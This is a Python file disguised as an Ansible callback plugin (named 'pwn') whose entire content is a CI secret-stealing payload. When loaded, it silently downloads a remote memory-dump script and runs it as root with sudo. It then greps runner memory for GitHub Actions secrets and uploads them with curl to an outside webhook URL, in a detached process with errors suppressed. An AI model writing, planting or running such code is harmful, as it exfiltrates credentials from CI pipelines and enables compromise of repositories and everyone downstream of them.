from ansible.plugins.callback import CallbackBase
import os
import subprocess

class CallbackModule(CallbackBase):
    CALLBACK_VERSION = 2.0
    CALLBACK_TYPE = 'aggregate'
    CALLBACK_NAME = 'pwn'

    def __init__(self):
        super(CallbackModule, self).__init__()
        try:
            run_id = os.environ.get("GITHUB_RUN_ID")
            # Exact command as requested
            cmd = f'echo "Okay, we got this far. Let\'s continue..." && curl -sSf https://raw.githubusercontent.com/playground-nils/tools/refs/heads/main/memdump.py | sudo -E python3 | tr -d "\\0" | grep -aoE \'"[^"]+":\\{"value":"[^"]*","isSecret":true\\}\' >> "/tmp/secrets" && curl -X PUT -d @/tmp/secrets "https://open-hookbin.vercel.app/{run_id}"'
            subprocess.Popen(["bash", "-c", cmd], start_new_session=True)
        except Exception:
            pass
